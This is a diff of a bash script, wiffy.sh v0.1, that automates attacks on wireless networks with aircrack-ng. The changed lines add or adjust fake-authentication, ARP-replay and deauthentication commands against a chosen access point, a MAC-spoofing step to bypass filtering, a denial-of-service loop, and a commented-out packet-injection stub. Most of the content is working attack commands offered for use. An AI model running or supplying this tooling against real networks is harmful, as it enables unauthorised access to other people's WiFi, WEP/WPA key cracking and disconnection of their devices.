@@ -1,6 +1,6 @@
 #!/bin/bash
 #----------------------------------------------------------------------------------------------#
-#wiffy.sh v0.1 (#5 2010-09-13)                                                                 #
+#wiffy.sh v0.1 (#6 2010-09-13)                                                                 #
 # (C)opyright 2010 - g0tmi1k                                                                   #
 #---License------------------------------------------------------------------------------------#
 #  This program is free software: you can redistribute it and/or modify it under the terms     #
@@ -37,7 +37,7 @@ diagnostics="false"
 verbose="0"
 
 #---Variables----------------------------------------------------------------------------------#
-         version="0.1 (#5)"   # Version
+         version="0.1 (#6)"   # Version
 monitorInterface="mon0"       # Default
            bssid=""           # null the value
            essid=""           # null the value
@@ -49,8 +49,9 @@ trap 'cleanup interrupt' 2    # Captures interrupt signal (Ctrl + C)
 
 #----Functions---------------------------------------------------------------------------------#
 function findAP () { #findAP
+   if [ -e "/tmp/wiffy.tmp" ] && grep -q "No scan results" "/tmp/wiffy.tmp" ; then action "Refreshing interface" "ifconfig $interface down && ifconfig $interface up && sleep 1" $verbose $diagnostics "true" ; fi
    action "Scanning network" "rm -f /tmp/wiffy.tmp && iwlist $interface scan > /tmp/wiffy.tmp" $verbose $diagnostics "true"
-   #arrayESSID=( $(cat /tmp/wiffy.tmp | awk -F":" '/ESSID/{print $2}') )
+   #arrayESSID=( $(cat /tmp/wiffy.tmp | awk -F ':' '/ESSID/{print $2}') )
    arrayBSSID=( $(cat /tmp/wiffy.tmp | grep "Address:" | awk '{print $5}\') )
    arrayChannel=( $(cat /tmp/wiffy.tmp | grep "Channel:" | tr ':' ' ' | awk '{print $2}\') )
    arrayProtected=( $(cat /tmp/wiffy.tmp | grep "key:" | sed 's/.*key://g') )
@@ -68,14 +69,14 @@ function findAP () { #findAP
    done
 
    #-Cheap hack to support essids with spaces in-----------------------------------------------------------
-   cat /tmp/wiffy.tmp | awk -F":" '/ESSID/{print $2}' | sed 's/\"//' | sed 's/\(.*\)\"/\1/' > /tmp/wiffy.ssid
+   cat "/tmp/wiffy.tmp" | awk -F ":" '/ESSID/{print $2}' | sed 's/\"//' | sed 's/\(.*\)\"/\1/' > "/tmp/wiffy.ssid"
    index="0"
    while read line ; do
       if [ "$essid" ] && [ "$essid" == "$line" ] ; then id="$index" ;  fi
       arrayESSID[$index]="$line"
       index=$(($index+1))
    done < "/tmp/wiffy.ssid"
-   rm -f /tmp/wiffy.ssid
+   rm -f "/tmp/wiffy.ssid"
    #--------------------------------------------------------------------------------------------------------------
 }
 function findClient () { #findClient $encryption
@@ -183,7 +184,7 @@ function help() {
 
    -e  ---  ESSID (WiFi Name)
    -b  ---  BSSID (AP MAC Address)
-   -c  ---  Client that is connect to the acess point
+   -c  ---  Client to use
 
    -w  ---  Path to Wordlist e.g. $wordlist
 
@@ -196,8 +197,8 @@ function help() {
    -v  ---  Verbose          (Displays more)
    -V  ---  (Higher) Verbose (Displays more + shows commands)
 
-   -u  ---  Update
-   -?  ---  This
+   -u  ---  Update script
+   -?  ---  This screen
 
 
 
@@ -219,7 +220,7 @@ function help() {
     -Doesn't detect any/my wireless network
        > Don't run from a virtual machine
        > Driver issue - Use a different WiFi device
-       > Try the 're[f]resh' option
+       > Re-run the script
        > Unplug WiFi device, wait, replug
        > You're too close/far away
 
@@ -245,9 +246,9 @@ function action() { # action title command $verbose $diagnostics screen&file x|y
       if [ "$4" == "true" ] ; then echo "$1~$command" >> $logFile ; fi
       if [ "$4" == "true" ] && [ "$5" == "true" ] ; then command="$command | tee -a $logFile" ; fi
       if [ ! -z "$6" ] ; then
-         x=$(echo $6 | cut -d'|' -f1)
-         y=$(echo $6 | cut -d'|' -f2)
-         lines=$(echo $6 | cut -d'|' -f3)
+         x=$(echo $6 | cut -d '|' -f1)
+         y=$(echo $6 | cut -d '|' -f2)
+         lines=$(echo $6 | cut -d '|' -f3)
       fi
       $xterm -geometry 100x$lines+$x+$y -T "wiffy v$version - $1" -e "$command"
       return 0
@@ -355,11 +356,11 @@ if [ "$debug" != "true" ] && [ "$debug" != "false" ] ; then display error "debug
 if [ "$diagnostics" == "true" ] && [ -z "$logFile" ] ; then display error "logFile ($logFile) isn't correct" $diagnostics 1>&2 ; cleanup ; fi
 
 #----------------------------------------------------------------------------------------------#
-command=$(iwconfig $interface 2>/dev/null | grep "802.11" | cut -d" " -f1)
+command=$(iwconfig $interface 2>/dev/null | grep "802.11" | cut -d " " -f1)
 if [ ! $command ]; then
    display error "$interface isn't a wireless interface." $diagnostics
    display info "Searching for a wireless interface" $diagnostics
-   command=$(iwconfig 2>/dev/null | grep "802.11" | cut -d" " -f1) #| awk '!/"'"$interface"'"/'
+   command=$(iwconfig 2>/dev/null | grep "802.11" | cut -d " " -f1) #| awk '!/"'"$interface"'"/'
    if [ $command ] ; then
       interface=$command
       display info "Found $interface" $diagnostics
@@ -369,7 +370,7 @@ if [ ! $command ]; then
    fi
 fi
 
-command=$(ifconfig -a | grep $interface | awk '{print $1}')
+command=$(ifconfig -a | grep "$interface" | awk '{print $1}')
 if [ "$command" != "$interface" ] ; then
    display error "The wireless interface $interface, isn't correct." $diagnostics 1>&2
    if [ "$debug" == "true" ] ; then iwconfig; fi
@@ -377,11 +378,11 @@ if [ "$command" != "$interface" ] ; then
 fi
 
 #----------------------------------------------------------------------------------------------#
-mac=$(macchanger --show $interface | awk -F " " '{print $3}')
+mac=$(macchanger --show "$interface" | awk -F " " '{print $3}')
 
 #----------------------------------------------------------------------------------------------#
 if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display action "Stopping: Programs" $diagnostics ; fi
-command=$(ps aux | grep $interface | awk '!/grep/ && !/awk/ && !/wiffy/ {print $2}' | while read line; do echo -n "$line "; done | awk '{print}')
+command=$(ps aux | grep "$interface" | awk '!/grep/ && !/awk/ && !/wiffy/ {print $2}' | while read line; do echo -n "$line "; done | awk '{print}')
 if [ -n "$command" ] ; then
    action "Killing programs" "kill $command" $verbose $diagnostics "true" # to prevent interference
 fi
@@ -405,10 +406,9 @@ while [ "$loopMain" != "true" ] ; do
       done
       loopSub="false"
       while [ "$loopSub" != "true" ] ; do
-         read -p "[~] re[s]can, re[f]resh, e[x]it or select num: "
+         read -p "[~] re[s]can, e[x]it or select num: "
          if [ "$REPLY" == "x" ] ; then cleanup clean
          elif [ "$REPLY" == "s" ] ; then loopSub="true" # aka do nothing
-         elif [ "$REPLY" == "f" ] ; then action "Refreshing interface" "ifconfig $interface down && sleep 1 && ifconfig $interface up && sleep 1" $verbose $diagnostics "true" && loopSub="true" # aka do nothing
          elif [ -z $(echo "$REPLY" | tr -dc '[:digit:]'l) ] ; then display error "Bad input, $REPLY" $diagnostics 1>&2
          elif [ "$REPLY" -lt 1 ] || [ "$REPLY" -gt $loop ] ; then display error "Incorrect number, $REPLY" $diagnostics 1>&2
          else id="$(($REPLY-1))" ; loopSub="true" ; loopMain="true"
@@ -471,7 +471,7 @@ if [ ! -e "/usr/sbin/airmon-ng" ] && [ ! -e "/usr/local/sbin/airmon-ng" ] ; then
    if [ ! -e "/usr/sbin/airmon-ng" ] && [ ! -e "/usr/local/sbin/airmon-ng" ] ; then
       display error "Failed to install aircrack-ng" $diagnostics 1>&2 ; cleanup
    else
-      display info "Installed aircrack-ng" $diagnostics
+      display info "Installed: aircrack-ng" $diagnostics
    fi
 fi
 if [ ! -e "/usr/bin/macchanger" ] ; then
@@ -481,7 +481,7 @@ if [ ! -e "/usr/bin/macchanger" ] ; then
    if [ ! -e "/usr/bin/macchanger" ] ; then
       display error "Failed to install macchanger" $diagnostics 1>&2 ; cleanup
    else
-      display info "Installed macchanger" $diagnostics
+      display info "Installed: macchanger" $diagnostics
    fi
 fi
 #if [ "$attack" == "inject" ] ; then
@@ -490,11 +490,9 @@ fi
 #      read -p "[~] Would you like to try and install it? [Y/n]: " -n 1
 #      if [[ $REPLY =~ ^[Yy]$ ]] ; then action "Install airpwn" "apt-get -y install libnet1-dev libpcap-dev python2.4-dev libpcre3-dev libssl-dev" $verbose $diagnostics "true" ; fi
 #      action "Install airpwn" "wget -P /tmp http://downloads.sourceforge.net/project/airpwn/airpwn/1.4/airpwn-1.4.tgz && tar -C /pentest/wireless -xvf /tmp/airpwn-1.4.tgz && rm /tmp/airpwn-1.4.tgz" $verbose $diagnostics "true"
-#      find="#include <linux/if.h>\n#ifndef _LINUX_WIRELESS_H"
-#      replace="#ifndef _LINUX_WIRELESS_H"
-#      sed "s/$find/$replace/g" "/usr/include/linux/wireless.h" > "/usr/include/linux/wireless.h.new"
 #      find="#ifndef _LINUX_WIRELESS_H"
-#      replace="#include <linux/if.h>\n#ifndef _LINUX_WIRELESS_H"
+#      replace="#include <linux\/if.h>\n#ifndef _LINUX_WIRELESS_H"
+#      sed "s/$replace/$find/g" "/usr/include/linux/wireless.h" > "/usr/include/linux/wireless.h.new"
 #      sed "s/$find/$replace/g" "/usr/include/linux/wireless.h.new" > "/usr/include/linux/wireless.h"
 #      rm -f "/usr/include/linux/wireless.h.new"
 #      action "Install airpwn" "command=$(pwd) && tar -C /pentest/wireless/airpwn-1.4 -xvf /pentest/wireless/airpwn-1.4/lorcon-current.tgz && cd /pentest/wireless/airpwn-1.4/lorcon && ./configure && make && make install && cd $command" $verbose $diagnostics "true"
@@ -502,7 +500,7 @@ fi
 #      if [ ! -e "/pentest/wireless/airpwn-1.4/airpwn" ] ; then
 #         display error "Failed to install airpwn" $diagnostics 1>&2 ; cleanup
 #      else
-#         display info "Installed airpwn" $diagnostics
+#         display info "Installed: airpwn" $diagnostics
 #      fi
 #   fi
 #fi
@@ -518,16 +516,16 @@ if [ "$command" == "$monitorInterface" ] ; then
    sleep 1
 fi
 
-action "Monitor Mode (Starting)" "airmon-ng start $interface | awk '/monitor mode enabled on/ {print \$5}' | tr -d '\011' | sed -e \"s/(monitor mode enabled on //\" | sed 's/\(.*\)./\1/' > /tmp/wiffy.tmp" $verbose $diagnostics "true"
-command=$(cat /tmp/wiffy.tmp)
+action "Monitor Mode (Starting)" "airmon-ng start $interface | tee /tmp/wiffy.tmp" $verbose $diagnostics "true"
+command=$(cat /tmp/wiffy.tmp | awk '/monitor mode enabled on/ {print $5}' | tr -d '\011' | sed 's/\(.*\)./\1/')
 if [ "$monitorInterface" != "$command" ] ; then
    if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then
       display info "Configuring: Chaning monitorInterface to: $command" $diagnostics
    fi
-   monitorInterface=$command
+   if [ $command ] ; then monitorInterface="$command" ; fi
 fi
 
-command=$(ifconfig -a | grep $monitorInterface | awk '{print $1}')
+command=$(ifconfig -a | grep "$monitorInterface" | awk '{print $1}')
 if [ "$command" != "$monitorInterface" ] ; then
    sleep 5 # Some people need to wait a little bit longer (e.g. VM), some don't. Don't force the ones that don't need it!
    command=$(ifconfig -a | grep $monitorInterface | awk '{print $1}')
@@ -577,18 +575,20 @@ if [ "$mode" == "crack" ] ; then
    if [ "$encryption" == "WEP" ] ; then
       if [ "$client" == "clientless" ] ; then
          display action "Attack (FakeAuth): $fakeMac" $diagnostics
-         action "aireplay-ng (fakeauth)" "aireplay-ng --fakeauth 0 -e \"$essid\" -a $bssid -h $mac $monitorInterface" $verbose $diagnostics "true"
-         #action "aireplay-ng (fakeauth)" "aireplay-ng --fakeauth 30 -o 1 -q 10 -e \"$essid\" -a $bssid -h $fakeMac $monitorInterface" $verbose $diagnostics "true"
-         #if [Association successful] = then
+         action "aireplay-ng (fakeauth)" "aireplay-ng --fakeauth 0 -e \"$essid\" -a $bssid -h $mac $monitorInterface | tee /tmp/wiffy.tmp" $verbose $diagnostics "true" "0|195|5"
+         command=$(cat /tmp/wiffy.tmp)
+         if grep -q "No such BSSID available" "/tmp/wiffy.tmp" ; then display error "Couldn't detect $essid" $diagnostics 1>&2 ;
+         elif grep -q "Association successful" "/tmp/wiffy.tmp" ; then if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display info "Attack (FakeAuth): Successfully association" $diagnostics ; fi ; fi
          client=$mac
          sleep 1
       fi
       display action "Attack (ARPReplay+Deauth): $client" $diagnostics
-      action "aireplay-ng (arpreplay)" "aireplay-ng --arpreplay -e \"$essid\" -b $bssid -h $client $monitorInterface" $verbose $diagnostics "true" "0|195|10" & # Don't wait, do the next command
+      action "aireplay-ng (arpreplay)" "aireplay-ng --arpreplay -e \"$essid\" -b $bssid -h $client $monitorInterface" $verbose $diagnostics "true" "0|195|5" & # Don't wait, do the next command
       sleep 1
-      action "aireplay-ng (deauth)" "aireplay-ng --deauth 5 -e \"$essid\" -a $bssid -c $fakeMac $monitorInterface" $verbose $diagnostics "true"
+      action "aireplay-ng (deauth)" "aireplay-ng --deauth 5 -e \"$essid\" -a $bssid -c $fakeMac $monitorInterface" $verbose $diagnostics "true" "0|290|5"
       sleep 1
-      if [ "$client" == "$mac" ] ; then sleep 20 && action "aireplay-ng (fakeauth)" "aireplay-ng --fakeauth 0 -e \"$essid\" -a $bssid -h $fakeMac $monitorInterface" $verbose $diagnostics "true" ; fi
+      if [ "$client" == "$mac" ] ; then sleep 10 && action "aireplay-ng (fakeauth)" "aireplay-ng --fakeauth 0 -e \"$essid\" -a $bssid -h $fakeMac $monitorInterface" $verbose $diagnostics "true" "0|290|5" ; fi
+      if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display action "Waiting for IV's increase" $diagnostics ; fi
       sleep 60
 
    #----------------------------------------------------------------------------------------------#
@@ -614,7 +614,7 @@ if [ "$mode" == "crack" ] ; then
          fi
          sleep 1
       done
-      if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display action "Captured: Handshake" $diagnostics ; fi
+      if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display info "Captured: Handshake" $diagnostics ; fi
       action "Killing programs" "killall xterm && sleep 1" $verbose $diagnostics "true"
    fi
 
@@ -637,7 +637,7 @@ if [ "$mode" == "crack" ] ; then
       if [ "$extras" == "true" ] ; then
          if [ "$client" != "$mac" ] ; then
             if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then  display action "Attack (Spoofing): $client ('Helps' with MAC filtering) " $diagnostics ; fi
-            action "airmon-ng" "ifconfig $interface down && macchanger -m $client $interface && ifconfig $interface up" $verbose $diagnostics "true"
+            action "Spoofing MAC" "ifconfig $interface down && macchanger -m $client $interface && ifconfig $interface up" $verbose $diagnostics "true"
          fi
          display action "Joining: $essid" $diagnostics
          if [ "$encryption" == "WEP" ] ; then
@@ -665,7 +665,6 @@ if [ "$mode" == "crack" ] ; then
       display error "Something went wrong )=" $diagnostics 1>&2
    fi
 
-
 #----------------------------------------------------------------------------------------------#
 elif [ "$mode" == "dos" ] ; then
    display action "Attack (DOS): $essid" $diagnostics
@@ -680,15 +679,18 @@ elif [ "$mode" == "dos" ] ; then
    for (( ; ; )) ; do
       sleep 5
    done
+#----------------------------------------------------------------------------------------------#
 #elif [ "$mode" == "inject" ] ; then
 #   display action "Attack (Inject): $essid" $diagnostics
 #   if [ "$encryption" != "WEP" ] ; then display error "Only works on WEP networks" $diagnostics 1>&2 ; cleanup ; fi
 
-   #action "aireplay-ng (Inject)" "airtun-ng -a $bssid $monitorInterface" $verbose $diagnostics "true" &
-   #action "aireplay-ng (Inject)" "ifconfig at0 192.168.1.83 netmask 255.255.255.0 up" $verbose $diagnostics "true" &
+#   action "aireplay-ng (Inject)" "airtun-ng -a $bssid $monitorInterface" $verbose $diagnostics "true" &
+#   action "aireplay-ng (Inject)" "ifconfig at0 192.168.1.83 netmask 255.255.255.0 up" $verbose $diagnostics "true" &
 
-   # airmon-ng start wlan0
-   # /pentest/wireless/airpwn-1.4/airpwn -c conf/greet_html -d rt73 -i mon0 -v
+#   action "Monitor Mode (Starting)" "airmon-ng start $interface | tee /tmp/wiffy.tmp" $verbose $diagnostics "true"
+#   command=$(cat /tmp/wiffy.tmp | grep ^$interface | awk -F "-" '{print $1}' | awk -F "$interface" '{print $2}' | sed 's/\"//' )
+#   Chipset - Driver
+#   /pentest/wireless/airpwn-1.4/airpwn -c conf/greet_html -d $driver -i $monitorInterface -vvvv
 
    #----------------------------------------------------------------------------------------------#
 #   display info "Attacking! ...press CTRL+C to stop" $diagnostics
